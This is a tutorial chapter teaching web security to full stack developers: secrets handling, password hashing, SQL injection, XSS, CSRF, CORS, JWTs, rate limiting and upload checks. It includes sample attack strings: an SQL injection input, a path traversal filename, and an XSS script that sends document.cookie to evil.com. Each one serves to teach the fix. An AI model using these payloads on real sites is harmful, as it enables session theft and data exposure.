# 26. Web Security

---

## Why Security Matters

Security isn't a feature you bolt on at the end — it's a set of habits you build into every line of code you write. A single mistake can expose your users' passwords, personal data, or financial information. The good news is that the vast majority of real-world attacks exploit well-known, preventable mistakes.

This note covers the threats you'll encounter in full stack web development and exactly what to do about each one.

---

## Keeping Secrets Secret: Environment Variables

The most common beginner mistake is committing an API key, database password, or secret token directly into source code and pushing it to GitHub. Bots scan GitHub for these 24/7 and will use them within minutes.

### The Rule

**Secrets never go in code. They go in environment variables.**

An environment variable is a value that lives in the operating system (or a `.env` file) rather than in your code. Your code reads it at runtime.

### How it works

Create a `.env` file in your project root:
```
DATABASE_URL=postgresql://user:password@host:5432/mydb
JWT_SECRET=super-long-random-string-here
STRIPE_SECRET_KEY=sk_live_abc123
```

Read it in Node.js:
```js
import 'dotenv/config';  // loads .env automatically

const db = new Pool({ connectionString: process.env.DATABASE_URL });
```

Read it in Python:
```python
from dotenv import load_dotenv
import os

load_dotenv()

DATABASE_URL = os.getenv("DATABASE_URL")
```

Read it in Next.js — prefix with `NEXT_PUBLIC_` for client-side access:
```
NEXT_PUBLIC_API_URL=https://api.myapp.com   ← visible in the browser
JWT_SECRET=mysecret                          ← server-side only
```

### .gitignore — the essential protection

Add `.env` to `.gitignore` immediately when you create a project. Never remove it.

```
# .gitignore
.env
.env.local
.env.production
*.env
```

### .env.example — share the structure, not the values

Commit a `.env.example` file (no real values) so other developers know which variables they need:
```
# .env.example — copy to .env and fill in your values
DATABASE_URL=
JWT_SECRET=
STRIPE_SECRET_KEY=
```

### What to do if you accidentally commit a secret

1. Immediately revoke/rotate the key (generate a new one in your provider's dashboard)
2. Remove it from the code and commit that fix
3. Use `git filter-branch` or BFG Repo Cleaner to remove it from Git history
4. The original key is compromised — assume it has been used

## HTTPS and Secure Connections

HTTPS encrypts the data travelling between the browser and your server. Without it, anyone on the same network (like a coffee shop Wi-Fi) can read passwords and tokens in plain text.

**Always use HTTPS in production.** Vercel, Netlify, Railway, and most hosting platforms enable it automatically with a free Let's Encrypt certificate.

In Express, redirect HTTP to HTTPS in production:
```js
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' && req.header('x-forwarded-proto') !== 'https') {
    return res.redirect(`https://${req.hostname}${req.url}`);
  }
  next();
});
```

## Password Hashing

**Never store passwords in plain text.** If your database is ever stolen, every user's password is exposed — and most people reuse passwords, so this means their other accounts are compromised too.

Instead, store a one-way hash. When the user logs in, hash their input and compare it to the stored hash.

### Why you can't use regular hashing (MD5, SHA-256)

MD5 and SHA-256 are designed to be fast. An attacker with a stolen database can try billions of guesses per second (a "brute force" attack). You need a hashing algorithm designed to be slow.

### bcrypt — the standard choice

bcrypt adds a "cost factor" that makes each hash take a configurable amount of time (~100ms is common). It also adds a "salt" — random data mixed into the hash so two users with the same password get different hashes.

```js
import bcrypt from 'bcrypt';

// When creating an account:
const SALT_ROUNDS = 12;  // higher = slower = more secure
const hashed = await bcrypt.hash(plainTextPassword, SALT_ROUNDS);
// Store `hashed` in the database — never `plainTextPassword`

// When logging in:
const isValid = await bcrypt.compare(attemptedPassword, storedHash);
if (!isValid) return res.status(401).json({ error: 'Invalid credentials' });
```

In Python with passlib:
```python
from passlib.context import CryptContext

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

hashed = pwd_context.hash(plain_password)
is_valid = pwd_context.verify(plain_password, hashed)
```

## SQL Injection

SQL injection is one of the oldest and most destructive attacks. If you build SQL queries by concatenating user input, an attacker can break out of the query and run their own SQL.

### The attack

```js
// VULNERABLE — never do this
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
```

If the user enters: `' OR '1'='1`

The query becomes:
```sql
SELECT * FROM users WHERE email = '' OR '1'='1'
```

This returns every row in the database. With a `DROP TABLE` instead, they delete your data.

### The fix: parameterised queries (also called prepared statements)

Always pass user data as separate parameters — never concatenate it into the query string.

```js
// SAFE — the database driver handles escaping
const { rows } = await pool.query(
  'SELECT * FROM users WHERE email = $1',
  [req.body.email]  // $1 is replaced safely
);
```

With an ORM like Prisma or SQLAlchemy, queries are parameterised automatically.

### Principle: never trust input

Validate and sanitise all data from users, URL parameters, headers, and external APIs before using it.

## XSS — Cross-Site Scripting

XSS attacks happen when you insert untrusted data directly into HTML, allowing an attacker to inject and run JavaScript in other users' browsers. This can steal session cookies, redirect users to phishing sites, or take over accounts.

### The attack

Imagine a comments section where you store the comment text and display it like this:
```js
// VULNERABLE
commentDiv.innerHTML = commentText;
```

If the comment is: `<script>fetch('https://evil.com?cookie=' + document.cookie)</script>`

That script runs in every visitor's browser and sends their cookie to the attacker.

### The fix: escape output, don't use innerHTML

```js
// SAFE — escapes all HTML characters
commentDiv.textContent = commentText;
// OR
element.innerHTML = DOMPurify.sanitize(commentText);  // if you NEED HTML
```

Frameworks like React escape HTML automatically when you use JSX:
```jsx
// Safe — React escapes this
<p>{userInput}</p>

// Dangerous — bypasses React's protection
<p dangerouslySetInnerHTML={{ __html: userInput }} />
```

On the server side, when rendering HTML templates, use your framework's escaping:
```python
# Jinja2 templates auto-escape by default
{{ user_input }}       # safe — escaped
{{ user_input|safe }}  # DANGEROUS — only use if you trust the input
```

### Content Security Policy (CSP)

A CSP header tells the browser which scripts it's allowed to run, blocking injected scripts even if they get into your HTML:

```js
// In Express:
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );
  next();
});
```

## CSRF — Cross-Site Request Forgery

CSRF tricks a logged-in user into making a request they didn't intend to. If your bank's "transfer money" form relies only on a session cookie, an attacker can make you visit a malicious page that submits that form automatically.

### How it works

1. You're logged into `bank.com` — your browser has a session cookie
2. You visit `evil.com` which has a hidden form that posts to `bank.com/transfer`
3. Your browser sends the request including your cookie
4. The bank processes it as if you did it

### The fix: CSRF tokens

A CSRF token is a random value generated per session, stored server-side, and embedded in every form. The server rejects requests that don't include the correct token.

For REST APIs that use JWT tokens in headers (not cookies), CSRF isn't a concern because JavaScript must explicitly set the `Authorization` header — cross-site requests can't do this without CORS permission.

### CORS — Cross-Origin Resource Sharing

CORS controls which origins (domains) are allowed to call your API. By default, browsers block cross-origin requests. Your API server must explicitly allow them.

```js
// In Express, using the cors package:
import cors from 'cors';

app.use(cors({
  origin: ['https://myapp.com', 'http://localhost:3000'],  // allowed origins
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,  // allow cookies/auth headers
}));

// NEVER do this in production:
app.use(cors({ origin: '*' }));  // allows any origin — dangerous if you have auth
```

In FastAPI:
```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
  CORSMiddleware,
  allow_origins=["https://myapp.com", "http://localhost:3000"],
  allow_methods=["*"],
  allow_headers=["Authorization", "Content-Type"],
)
```

## Authentication and Session Security

### JWT Best Practices

JSON Web Tokens (JWTs) are signed tokens used for API authentication.

```js
// Sign a JWT
const token = jwt.sign(
  { userId: user.id },        // payload — what's stored in the token
  process.env.JWT_SECRET,     // secret — keep this safe
  { expiresIn: '7d' }         // expiry — short is more secure
);

// Verify a JWT
try {
  const payload = jwt.verify(token, process.env.JWT_SECRET);
} catch (err) {
  // Token is invalid or expired
}
```

Important rules:
- **Use a long, random JWT_SECRET** (at least 32 characters): `openssl rand -base64 32`
- **Set an expiry** — tokens without expiry are valid forever if stolen
- **Short-lived access tokens + long-lived refresh tokens** is the most secure pattern
- **Don't store JWTs in localStorage** if possible — `httpOnly` cookies can't be read by JavaScript, making XSS attacks less damaging

### HTTP-Only Cookies for Tokens

```js
// Set an httpOnly cookie (can't be read by JavaScript)
res.cookie('token', jwtToken, {
  httpOnly: true,     // not accessible to JS
  secure:   true,     // HTTPS only
  sameSite: 'lax',    // CSRF protection
  maxAge:   7 * 24 * 60 * 60 * 1000  // 7 days in ms
});
```

### Rate Limiting

Rate limiting prevents brute force attacks (trying thousands of passwords) and API abuse.

```js
import rateLimit from 'express-rate-limit';

// Limit login attempts
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max:      10,               // max 10 attempts per 15 mins per IP
  message:  'Too many login attempts. Try again in 15 minutes.',
});

app.post('/api/auth/login', loginLimiter, loginHandler);
```

## Database Security

### Principle of Least Privilege

Your app's database user should only have the permissions it actually needs. If your app only reads and writes data, it shouldn't be able to drop tables.

```sql
-- Create a restricted database user for your app
CREATE USER app_user WITH PASSWORD 'strong-password';
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;
-- Do NOT grant: DROP, CREATE, TRUNCATE
```

### Backup Your Data

Databases fail. Always have automated backups.
- Supabase and Neon include daily backups on their free tiers
- For self-hosted PostgreSQL: `pg_dump` on a cron job

### Input Validation at Every Layer

Never trust data. Validate at all three levels:
1. **Frontend** — client-side validation (UX only, not security)
2. **API** — validate and sanitise before using in any query (Pydantic, Joi, Zod)
3. **Database** — use constraints (NOT NULL, CHECK, UNIQUE, FOREIGN KEY)

## Security Headers

A few simple HTTP headers significantly reduce attack surface:

```js
// Install: npm install helmet
import helmet from 'helmet';

app.use(helmet());  // sets safe defaults for all security headers
```

What helmet sets:
| Header | What it does |
| ------ | ------------ |
| `X-Content-Type-Options: nosniff` | Prevents browser from guessing content types |
| `X-Frame-Options: DENY` | Prevents your site being embedded in an iframe (clickjacking) |
| `Strict-Transport-Security` | Forces HTTPS for future visits |
| `Content-Security-Policy` | Restricts where scripts and styles can come from |
| `X-XSS-Protection: 0` | Disables buggy browser XSS filter (CSP is better) |

## Dependency Security

Your project's npm packages can have vulnerabilities. Check regularly:

```bash
npm audit          # shows known vulnerabilities
npm audit fix      # auto-fixes where possible
```

Use tools like Snyk or GitHub's Dependabot to get automatic pull requests when vulnerabilities are found in your dependencies.

Never install packages blindly. Check:
- Is the package still maintained (last commit date)?
- Does it have a lot of dependents (more scrutiny from the community)?
- Check the npm page: `npmjs.com/package/[name]`

## File Upload Security

If your app accepts file uploads, these are the risks:
- User uploads a `.php` or `.js` file that gets executed on your server
- User uploads a massive file that fills your disk

```js
// Using multer with restrictions:
import multer from 'multer';

const upload = multer({
  limits: { fileSize: 5 * 1024 * 1024 },  // 5MB max
  fileFilter: (req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'image/webp'];
    if (allowed.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Only JPEG, PNG, and WebP images allowed'));
    }
  }
});
```

Additional rules:
- **Never serve uploaded files from the same domain as your app** — use a CDN or S3
- **Rename files** on upload — never keep the user's filename (could contain path traversal: `../../etc/passwd`)
- **Validate file contents**, not just the extension — a file named `photo.jpg` could actually be PHP code

## OWASP Top 10

The OWASP (Open Web Application Security Project) Top 10 is the industry-standard list of the most critical web security risks. Study it:

1. **Broken Access Control** — users can access data/actions they shouldn't
2. **Cryptographic Failures** — weak encryption, unencrypted data, storing passwords in plain text
3. **Injection** — SQL injection, command injection, XSS
4. **Insecure Design** — architectural flaws that can't be patched later
5. **Security Misconfiguration** — default passwords, exposed error messages, missing headers
6. **Vulnerable and Outdated Components** — using packages with known vulnerabilities
7. **Identification and Authentication Failures** — weak passwords, missing MFA, no rate limiting
8. **Software and Data Integrity Failures** — using unverified packages or CI/CD pipelines
9. **Security Logging and Monitoring Failures** — not logging security events, no alerting
10. **Server-Side Request Forgery (SSRF)** — tricking your server into making requests to internal systems

Full details: https://owasp.org/www-project-top-ten/

## Quick Security Checklist

Before deploying any project, run through this:

- [ ] All secrets are in `.env` and `.env` is in `.gitignore`
- [ ] Passwords are hashed with bcrypt (not MD5, not SHA-256, not plain text)
- [ ] All database queries use parameterised statements
- [ ] User input is validated before use
- [ ] HTML output is escaped (using `textContent`, React JSX, or a sanitiser)
- [ ] HTTPS is enabled
- [ ] CORS is configured to allow only your own frontend's domain
- [ ] Rate limiting is applied to auth endpoints
- [ ] Security headers are set (helmet.js or equivalent)
- [ ] `npm audit` returns no critical or high vulnerabilities
- [ ] File uploads validate type and size
- [ ] Error messages don't leak stack traces or database details to users
- [ ] Database user has minimum required permissions
